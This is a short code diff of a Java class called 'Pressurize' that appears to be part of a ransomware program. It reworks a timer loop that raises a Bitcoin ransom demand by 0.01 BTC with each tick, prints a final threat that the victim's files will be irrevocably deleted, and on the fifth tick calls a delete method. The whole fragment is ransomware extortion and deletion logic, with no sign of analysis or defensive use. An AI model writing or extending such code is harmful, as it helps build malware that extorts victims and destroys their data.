@@ -41,21 +41,20 @@ public class Pressurize implements IConsoleUser {
                     timerCount++;
                     Double toPay = 0.02755 + timerCount * 0.01;
 
+
                     if (timerCount < 4) {
                         ConsoleCorrespondation.M_RANSOMINCREASED.setValue(">>Amount to pay increased by 0,01 BTC to: " + toPay + " BTC");
                         writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED, TextColor.RED);
 
-                    } else {
+                    } else if(timerCount == 4) {
                         ConsoleCorrespondation.M_RANSOMFINAL.setValue(">>Pay " + toPay + " BTC immediately or your files will be irrevocably deleted!");
                         writeToConsole(ConsoleCorrespondation.M_RANSOMFINAL, TextColor.RED);
-                    }
-                    if (timerCount < 5) restartTimer();
-
-                    if (timerCount == 5) {
-                        //TODO check if we can do this via CC --> just one instance of Reflector
+                    }else if(timerCount == 5){
                         reflector.delete();
                         writeToConsole(ConsoleCorrespondation.M_BUSTED, TextColor.RED);
                     }
+
+                    if (timerCount < 5) restartTimer();
                 }
             };
             timer.schedule(task, this.delay);
